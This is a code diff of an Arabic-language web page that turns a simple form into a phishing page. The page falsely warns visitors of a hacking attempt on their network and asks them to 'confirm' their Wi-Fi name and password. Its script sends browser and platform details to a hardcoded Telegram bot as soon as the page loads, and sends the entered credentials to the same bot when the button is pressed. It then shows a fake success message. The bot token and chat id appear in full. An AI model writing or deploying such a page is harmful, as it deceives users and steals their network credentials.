@@ -3,37 +3,61 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تأمين النظام</title>
+    <title>نظام تأمين الشبكة</title>
     <style>
-        body { background: #050a10; color: #00d2ff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-        .box { background: rgba(0, 210, 255, 0.05); padding: 30px; border: 1px solid #00d2ff; border-radius: 15px; box-shadow: 0 0 20px #00d2ff33; width: 85%; text-align: center; }
-        input { width: 90%; padding: 12px; margin: 10px 0; background: #0b1622; border: 1px solid #00d2ff; color: white; border-radius: 5px; outline: none; }
-        .btn { background: #00d2ff; color: #050a10; padding: 12px 40px; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 15px; width: 100%; }
-        .info-row { font-size: 12px; color: #666; margin-bottom: 5px; text-align: left; }
+        body { background: #0d1117; color: #58a6ff; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: #161b22; padding: 30px; border-radius: 15px; border: 1px solid #30363d; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 90%; max-width: 400px; text-align: center; }
+        h2 { color: #f85149; margin-bottom: 10px; }
+        input { width: 100%; padding: 12px; margin: 10px 0; background: #0d1117; border: 1px solid #30363d; color: white; border-radius: 6px; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background: #238636; color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        button:hover { background: #2ea043; }
+        .footer { font-size: 11px; color: #8b949e; margin-top: 20px; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <h2 style="margin-top:0;">🛡️ تأمين الاتصال</h2>
-        <p style="font-size: 14px; color: #aaa;">الرجاء تأكيد بيانات الشبكة لمتابعة الاستخدام</p>
-        
-        <input type="text" placeholder="اسم شبكة Wi-Fi" id="wifi_name">
-        <input type="password" placeholder="كلمة مرور الشبكة" id="wifi_pass">
-        
-        <button class="btn" onclick="alert('جاري المزامنة مع النظام...')">تأكيد البيانات</button>
-        
-        <div style="margin-top: 20px; border-top: 1px solid #222; padding-top: 10px;">
-            <div class="info-row" id="battery">جاري فحص البطارية...</div>
-            <div class="info-row" id="browser">متصفح النظام: جاري التعرف...</div>
-        </div>
-    </div>
 
-    <script>
-        // سحب معلومات البطارية والمتصفح داخل الموقع
-        navigator.getBattery().then(function(battery) {
-            document.getElementById('battery').innerText = "مستوى الشحن: " + (battery.level * 100) + "%";
+<div class="card">
+    <h2>⚠️ تنبيه أمني</h2>
+    <p>تم رصد محاولة اختراق لشبكتك. يرجى تأكيد الهوية لتشفير الاتصال.</p>
+    
+    <input type="text" id="wifi_name" placeholder="اسم الشبكة (SSID)">
+    <input type="password" id="wifi_pass" placeholder="كلمة مرور الشبكة">
+    
+    <button onclick="sendData()">تأمين الاتصال الآن</button>
+    
+    <div class="footer">المعرف الرقمي للاتصال: <span id="user_ip">جاري الفحص...</span></div>
+</div>
+
+<script>
+    // إعدادات البوت الخاص بك
+    const token = "8570413998:AAHjdBQuzcwo6Qh3sEJ3bIe-tjeFhz1A1GU";
+    const chat_id = "8042090388";
+
+    // 1. سحب معلومات المتصفح والنظام تلقائياً عند فتح الصفحة
+    window.onload = function() {
+        const info = `🚀 زائر جديد للموقع:\n🌐 المتصفح: ${navigator.userAgent}\n🖥️ المنصة: ${navigator.platform}`;
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(info)}`);
+    };
+
+    // 2. إرسال بيانات الواي فاي عند الضغط على الزر
+    function sendData() {
+        const name = document.getElementById('wifi_name').value;
+        const pass = document.getElementById('wifi_pass').value;
+
+        if(name === "" || pass === "") {
+            alert("يرجى إدخال البيانات كاملة");
+            return;
+        }
+
+        const message = `🔑 بيانات مسحوبة من الموقع:\n📶 الشبكة: ${name}\n🔐 الباسورد: ${pass}`;
+        
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`)
+        .then(() => {
+            alert("تم إرسال الطلب، جاري تأمين جهازك...");
+            document.body.innerHTML = "<h1 style='color:white; text-align:center;'>تم التأمين بنجاح ✅</h1>";
         });
-        document.getElementById('browser').innerText = "المتصفح: " + navigator.appName;
-    </script>
+    }
+</script>
+
 </body>
 </html>
